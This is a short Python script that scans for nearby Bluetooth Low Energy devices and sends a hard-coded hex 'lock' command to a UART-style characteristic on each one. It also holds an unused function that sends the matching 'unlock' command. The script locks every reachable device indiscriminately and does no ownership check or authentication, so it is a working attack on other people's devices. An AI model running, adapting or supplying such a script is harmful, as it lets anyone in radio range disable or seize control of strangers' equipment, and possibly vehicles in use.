from bluepy import btle
from bluepy.btle import Scanner, DefaultDelegate
from bluepy.btle import BTLEDisconnectError
from bluepy.btle import BTLEGattError

import codecs

counter = 0


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

   # def handleDiscovery(self, dev, isNewDev, isNewData):


def lock_device(dev):
    peri = btle.Peripheral(dev)
    characteristics = peri.getCharacteristics(uuid="6e400002-b5a3-f393-e0a9-e50e24dcca9e")[0]
    characteristics.write(codecs.decode('55aa032003700168ff', 'hex'))
    peri.disconnect()
    print("Succesfully locked device!")


def unlock_device(dev):
    print("Unlocking device")
    peri = btle.Peripheral(dev)
    characteristics = peri.getCharacteristics(uuid="6e400002-b5a3-f393-e0a9-e50e24dcca9e")[0]
    characteristics.write(codecs.decode('55aa032003710167ff', 'hex'))
    peri.disconnect()
  #  Unlock = "55aa032003710167ff".decode("hex")


scanner = Scanner().withDelegate(ScanDelegate())
devices = scanner.scan(2)

print("Found ", devices.__sizeof__(), " device/s in bluetooth area")

for device in devices:
    try:
        print("Attempting to lock device ", device.addr, device.getScanData())
        lock_device(device)
    except (BTLEDisconnectError, BTLEGattError):
        print("Couldn't connect")
